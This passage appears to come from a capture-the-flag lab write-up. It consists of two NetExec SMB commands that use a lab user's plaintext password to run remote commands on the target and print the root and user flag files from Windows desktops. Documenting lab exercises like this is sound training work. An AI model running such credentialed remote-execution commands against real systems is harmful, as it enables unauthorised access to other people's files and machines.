Let’s get the flags:

```bash
nxc smb 10.10.11.129 -u tristan.davies -p 'newP@ssword2022' -x "type C:\Users\Administrator\Desktop\root.txt"

nxc smb 10.10.11.129 -u tristan.davies -p 'newP@ssword2022' -x "type C:\Users\sierra.frye\Desktop\user.txt"
```